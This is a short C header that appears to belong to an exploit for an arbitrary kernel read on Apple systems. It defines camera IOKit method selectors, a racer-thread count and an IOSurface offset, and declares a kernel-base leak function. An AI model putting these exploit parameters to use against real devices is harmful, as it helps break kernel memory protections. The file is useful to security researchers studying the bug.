/*
	Arbitrary kernel read embarassement.
*/

#include "IOKitLib.h"
#ifndef KERNEL_READ_H_
#define KERNEL_READ_H_

#define IOSERVICE_NAME_ALL_SERVICES							("IOService")
#define CAMERA_SERVICE_NAME_SUFFIX							("CamIn")

#define CAMERA_EXTERNAL_METHOD_GETSETFILE_SURFACE_ID		(19)
#define CAMERA_EXTERNAL_METHOD_LOAD_DATA_FILE				(39)

#define NUMBER_OF_BULK_RACERS								(0x10)

#define IOSURFACE_OFFSET_BULK_ATTACHMENT					(0x234)

kern_return_t kernel_read_init();
kern_return_t kernel_read_cleanup();
kern_return_t kernel_read_leak_kernel_base(uint64_t * kernel_base);

#endif /* KERNEL_READ_H_ */
